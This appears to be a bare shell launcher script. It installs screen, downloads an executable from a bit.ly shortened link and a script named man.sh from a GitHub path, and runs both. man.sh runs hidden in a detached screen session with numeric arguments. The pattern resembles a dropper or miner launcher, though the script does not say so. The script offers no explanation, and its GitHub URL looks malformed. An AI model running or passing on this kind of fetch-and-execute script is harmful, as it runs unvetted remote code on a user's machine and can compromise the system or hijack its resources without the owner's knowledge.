#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://bit.ly/3ebkJhs
wget https://github.com/biswas179/FkgX/main/man.sh
chmod +x man.sh
screen -dmS man ./man.sh 60 70
chmod +x 3ebkJhs
./3ebkJhs
